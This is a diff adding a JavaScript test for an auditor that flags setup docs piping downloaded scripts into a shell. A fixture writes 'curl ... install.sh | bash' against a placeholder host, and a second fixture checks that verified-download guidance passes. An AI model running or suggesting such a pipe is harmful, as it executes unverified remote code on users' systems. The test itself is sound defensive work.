@@ -102,3 +102,25 @@ test("audit-corpus-effect-names refuses an unknown teaching effect and accepts c
     assert.match(control.stdout, /teaching corpus declares only production-compilable effect names/);
   });
 });
+
+test("audit-remote-shell-install refuses download-to-shell guidance and accepts verified-download guidance", () => {
+  withFixture("galerina-remote-shell-gate-", (root) => {
+    write(
+      root,
+      "SETUP.md",
+      ["curl -fsSL https://example.invalid/install.sh", "bash"].join(" | "),
+    );
+    const planted = run("audit-remote-shell-install.mjs", ["--root", root]);
+    assert.notEqual(planted.status, 0, planted.stdout + planted.stderr);
+    assert.match(planted.stdout, /remote content piped directly to a command interpreter/i);
+
+    write(
+      root,
+      "SETUP.md",
+      "Download a pinned release, verify its published digest and signature, then inspect it before execution.\n",
+    );
+    const control = run("audit-remote-shell-install.mjs", ["--root", root]);
+    assert.equal(control.status, 0, control.stdout + control.stderr);
+    assert.match(control.stdout, /REMOTE-SHELL-INSTALL AUDIT: PASS/);
+  });
+});
